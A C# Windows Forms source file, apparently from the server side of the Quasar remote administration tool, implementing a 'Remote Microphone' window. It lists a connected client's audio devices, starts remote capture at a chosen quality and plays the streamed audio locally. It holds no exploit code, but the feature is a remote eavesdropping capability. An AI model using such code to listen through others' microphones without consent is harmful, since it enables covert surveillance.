using NAudio.Wave;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteMicrophone : Form
    {
        /// <summary>
        /// The client which can be used for the remote microphone.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly RemoteMicrophoneHandler _remoteMicrophoneHandler;

        /// <summary>
        /// The audio output device for playback.
        /// </summary>
        private WaveOut _waveOut;

        /// <summary>
        /// The buffered wave provider that feeds audio data to WaveOut.
        /// </summary>
        private BufferedWaveProvider _bufferedWaveProvider;

        /// <summary>
        /// Audio quality presets: display name -> (sampleRate, channels).
        /// </summary>
        private readonly List<AudioQualityPreset> _qualityPresets = new List<AudioQualityPreset>
        {
            new AudioQualityPreset("Low (8 kHz, Mono)", 8000, 1),
            new AudioQualityPreset("Medium (16 kHz, Mono)", 16000, 1),
            new AudioQualityPreset("High (44.1 kHz, Mono)", 44100, 1),
            new AudioQualityPreset("Best (44.1 kHz, Stereo)", 44100, 2)
        };

        /// <summary>
        /// Holds the opened remote microphone form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteMicrophone> OpenedForms = new Dictionary<Client, FrmRemoteMicrophone>();

        /// <summary>
        /// Creates a new remote microphone form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote microphone form.</param>
        /// <returns>
        /// Returns a new remote microphone form for the client if there is none currently open, otherwise returns the existing one.
        /// </returns>
        public static FrmRemoteMicrophone CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteMicrophone f = new FrmRemoteMicrophone(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteMicrophone"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote microphone form.</param>
        public FrmRemoteMicrophone(Client client)
        {
            _connectClient = client;
            _remoteMicrophoneHandler = new RemoteMicrophoneHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the remote microphone message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _remoteMicrophoneHandler.AudioDevicesChanged += AudioDevicesChanged;
            _remoteMicrophoneHandler.ProgressChanged += AudioDataReceived;
            MessageHandler.Register(_remoteMicrophoneHandler);
        }

        /// <summary>
        /// Unregisters the remote microphone message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_remoteMicrophoneHandler);
            _remoteMicrophoneHandler.AudioDevicesChanged -= AudioDevicesChanged;
            _remoteMicrophoneHandler.ProgressChanged -= AudioDataReceived;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever the remote audio devices changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="deviceNames">The currently available audio input devices.</param>
        private void AudioDevicesChanged(object sender, string[] deviceNames)
        {
            cbMicrophones.Items.Clear();
            foreach (string name in deviceNames)
            {
                cbMicrophones.Items.Add(name);
            }
            if (cbMicrophones.Items.Count > 0)
                cbMicrophones.SelectedIndex = 0;
        }

        /// <summary>
        /// Called whenever audio data is received from the client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="audioData">The raw PCM audio data.</param>
        private void AudioDataReceived(object sender, byte[] audioData)
        {
            try
            {
                if (_bufferedWaveProvider != null && audioData != null && audioData.Length > 0)
                {
                    _bufferedWaveProvider.AddSamples(audioData, 0, audioData.Length);
                }
            }
            catch (Exception)
            {
                // Buffer overflow or playback error - ignore to keep stream going
            }
        }

        /// <summary>
        /// Starts audio capture on the client and playback on the server.
        /// </summary>
        private void StartListening()
        {
            if (cbMicrophones.Items.Count == 0)
            {
                MessageBox.Show("No remote microphone detected.\nPlease wait till the client sends a list with available devices.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var preset = _qualityPresets[cbQuality.SelectedIndex];

            // Initialize local playback
            var waveFormat = new WaveFormat(preset.SampleRate, 16, preset.Channels);
            _bufferedWaveProvider = new BufferedWaveProvider(waveFormat)
            {
                BufferDuration = TimeSpan.FromSeconds(5),
                DiscardOnBufferOverflow = true
            };

            _waveOut = new WaveOut();
            _waveOut.Init(_bufferedWaveProvider);
            _waveOut.Volume = trkVolume.Value / 100f;
            _waveOut.Play();

            // Start remote capture
            _remoteMicrophoneHandler.BeginReceiveAudio(
                cbMicrophones.SelectedIndex,
                preset.SampleRate,
                preset.Channels,
                16);

            ToggleControls(true);
        }

        /// <summary>
        /// Stops audio capture on the client and playback on the server.
        /// </summary>
        private void StopListening()
        {
            _remoteMicrophoneHandler.EndReceiveAudio();

            if (_waveOut != null)
            {
                try
                {
                    _waveOut.Stop();
                    _waveOut.Dispose();
                }
                catch
                {
                }
                _waveOut = null;
            }
            _bufferedWaveProvider = null;

            ToggleControls(false);
        }

        /// <summary>
        /// Toggles the activatability of configuration controls.
        /// </summary>
        /// <param name="started">When true, controls are set to "started" state.</param>
        private void ToggleControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            cbMicrophones.Enabled = !started;
            cbQuality.Enabled = !started;
            btnRefresh.Enabled = !started;
        }

        private void FrmRemoteMicrophone_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Microphone", _connectClient);

            // Populate quality presets
            cbQuality.Items.Clear();
            foreach (var preset in _qualityPresets)
            {
                cbQuality.Items.Add(preset.DisplayName);
            }
            cbQuality.SelectedIndex = 1; // Default to Medium

            // Request audio devices from client
            _remoteMicrophoneHandler.RefreshAudioDevices();
        }

        private void FrmRemoteMicrophone_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_remoteMicrophoneHandler.IsStarted)
                StopListening();
            UnregisterMessageHandler();
            _remoteMicrophoneHandler.Dispose();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            StartListening();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            StopListening();
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            _remoteMicrophoneHandler.RefreshAudioDevices();
        }

        private void trkVolume_Scroll(object sender, EventArgs e)
        {
            lblVolume.Text = trkVolume.Value + "%";
            if (_waveOut != null)
            {
                _waveOut.Volume = trkVolume.Value / 100f;
            }
        }

        /// <summary>
        /// Represents an audio quality preset.
        /// </summary>
        private class AudioQualityPreset
        {
            public string DisplayName { get; }
            public int SampleRate { get; }
            public int Channels { get; }

            public AudioQualityPreset(string displayName, int sampleRate, int channels)
            {
                DisplayName = displayName;
                SampleRate = sampleRate;
                Channels = channels;
            }
        }
    }
}
